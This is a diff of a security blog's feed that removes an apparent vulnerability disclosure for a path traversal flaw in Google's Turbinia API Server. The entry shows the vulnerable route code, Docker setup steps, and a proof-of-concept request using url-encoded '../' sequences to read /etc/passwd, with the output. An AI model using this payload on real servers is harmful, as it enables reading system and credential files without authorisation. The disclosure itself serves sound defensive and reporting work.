-<p><a href="https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141">https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in Turbinia API Server</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in Turbinia API Server" /><published>2024-05-08T10:31:06+08:00</published><updated>2024-05-08T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Local File Inclusion in Turbinia API Server</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>A local file inclusion is present in the Turbinia API Server when requesting resource files under the <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> route.</p>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>The <a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L47">route</a> <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> is used for serving CSS and JS resources for Turbinia Web service. The <code class="language-plaintext highlighter-rouge">catchall</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">../</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@ui_router.get(
-    '/assets/{catchall:path}', name='assets', include_in_schema=False)
-async def serve_assets(request: Request):
-  """Serves assets content."""
-  static_content_path = pathlib.Path(_config.WEBUI_PATH).joinpath('dist/assets')
-  path = request.path_params['catchall']
-  file = static_content_path.joinpath(path)
-  if os.path.exists(file):
-    return FileResponse(file)
-
-  raise HTTPException(status_code=404, detail='Not found')
-</code></pre></div></div>
-
-<h3 id="steps-to-reproduce">Steps to reproduce</h3>
-
-<p>Following official <a href="https://turbinia.readthedocs.io/en/latest/user/install.html#docker-installation">docker tutorial</a> to set up the Turbinia service:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/google/turbinia.git
-cd turbinia
-mkdir -p ./conf &amp;&amp; mkdir -p ./tmp &amp;&amp; mkdir -p ./evidence &amp;&amp; mkdir -p ./certs &amp;&amp; chmod 777 ./conf ./tmp ./evidence ./certs
-sed -f docker/local/local-config.sed turbinia/config/turbinia_config_tmpl.py &gt; conf/turbinia.conf
-</code></pre></div></div>
-<p>Then, edit the <code class="language-plaintext highlighter-rouge">./docker/local/docker-compose.yml</code>, in <code class="language-plaintext highlighter-rouge">turbinia-api-server</code> section, expose Turbinia API Server port <code class="language-plaintext highlighter-rouge">8000</code> to host mechine by adding <code class="language-plaintext highlighter-rouge">ports: - "8000:8000"</code>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
-turbinia-api-server:
-        #image: "turbinia-api-server-dev" # Use this for local development and comment out below line
-        image: "us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-api-server:latest" # Latest stable
-        container_name: turbinia-api-server
-        depends_on:
-            - redis
-        volumes:
-            - $PWD/evidence:/evidence
-            - $PWD/conf/turbinia.conf:/etc/turbinia/turbinia.conf
-        environment:
-            - LC_ALL=C.UTF-8
-            - LANG=C.UTF-8
-            - TURBINIA_EXTRA_ARGS=${TURBINIA_EXTRA_ARGS}
-        expose:
-            - "8000"
-        ports:
-            - "8000:8000"
-...
-</code></pre></div></div>
-<p>Finally, bring up the local Turbinia stack:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose -f ./docker/local/docker-compose.yml up
-</code></pre></div></div>
-
-<p>After service up, the Turbinia API Server will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code> in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/index-a76ac6aa.js HTTP/1.1
-Accept: */*
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
-Cache-Control: no-cache
-Cookie: fakesession=hello
-Origin: http://0.0.0.0:8000
-Pragma: no-cache
-Referer: http://0.0.0.0:8000/web
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
-Host: 127.0.0.1:8000
-Accept-Encoding: gzip, deflate
-Connection: close
-</code></pre></div></div>
-
-<p>Modify the request by change <code class="language-plaintext highlighter-rouge">index-a76ac6aa.js</code> part to <code class="language-plaintext highlighter-rouge">..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> which is <code class="language-plaintext highlighter-rouge">../../../../../../etc/passwd</code> url-encoded content.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
-Accept: */*
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
-Cache-Control: no-cache
-Cookie: fakesession=hello
-Origin: http://0.0.0.0:8000
-Pragma: no-cache
-Referer: http://0.0.0.0:8000/web
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
-Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
-Host: 127.0.0.1:8000
-Accept-Encoding: gzip, deflate
-Connection: close
-</code></pre></div></div>
-
-<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> in browser.</p>
-
-<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-turbinia:x:999:999::/home/turbinia:/sbin/nologin
-</code></pre></div></div>
-
-<p><img src="/assets/cve/Turbinia.png" alt="Turbinia" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>Any file on the backend filesystem can be read by an attacker with access to the Turbinia API Server website.</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141">https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
